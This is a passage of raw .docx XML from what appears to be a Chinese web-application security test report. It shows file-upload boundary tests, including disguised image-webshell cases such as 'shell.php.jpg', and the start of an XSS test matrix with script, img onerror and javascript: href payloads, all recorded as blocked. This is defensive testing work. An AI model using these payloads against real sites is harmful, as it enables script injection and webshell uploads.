            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>shell.php.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">取 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>.jpg</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>，UUID 重命名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>无扩展名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>test</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>仅扩展名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>图片马 - PHP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">PHP 代码保存为 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Magic Number 检测 → 拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>图片马 - JSP</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">JSP 代码保存为 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>.png</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Magic Number 检测 → 拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>图片马 - Python</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">Python 代码保存为 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>.gif</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Magic Number 检测 → 拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>HTML 伪装</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve">HTML 文件改后缀 </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Magic Number 检测 → 拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>超大文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>17MB（超 MAX_CONTENT_LENGTH）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Flask 自动拒绝 413</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>空文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>0 字节文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Magic Number 检测 → 拒绝</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1881"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>7.3 XSS 边界测试矩阵</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667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试类别</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>测试用例</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>预期</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>实际</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>标准 script 标签</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>删除 script</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>图片 onerror</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;img src=x onerror=alert(1)&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>删除 img</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>javascript: href</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>清理 href</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
